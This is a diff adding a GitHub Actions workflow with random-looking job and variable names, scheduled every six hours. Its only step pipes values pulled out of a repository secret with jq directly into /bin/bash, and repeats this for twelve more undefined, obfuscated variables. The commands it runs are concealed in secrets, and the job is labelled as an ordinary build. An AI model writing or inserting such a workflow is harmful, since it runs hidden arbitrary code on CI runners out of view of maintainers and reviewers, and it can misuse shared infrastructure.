@@ -1,0 +1,28 @@
+name: zhaoqingyun3456
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhaoqingyun3456
+        env:
+          s5210: ${{ secrets.s5210 }}
+        run: |
+          echo $s5210 | jq -r .jtv6 | /bin/bash
+          echo $r91133 | jq -r .qbqsg99146 | /bin/bash
+          echo $qf2 | jq -r .oaoub4 | /bin/bash
+          echo $tcrzd69 | jq -r .iwkxw7 | /bin/bash
+          echo $gop90730 | jq -r .j5418 | /bin/bash
+          echo $lx0 | jq -r .isg44 | /bin/bash
+          echo $s7 | jq -r .jbb5023 | /bin/bash
+          echo $lmdtb4015 | jq -r .byk2596 | /bin/bash
+          echo $py061 | jq -r .kx760 | /bin/bash
+          echo $ssvox3 | jq -r .c1006 | /bin/bash
+          echo $cp1179 | jq -r .nxxw8 | /bin/bash
+          echo $rr9 | jq -r .pso5480 | /bin/bash
+          echo $p0 | jq -r .ldpe68 | /bin/bash
+
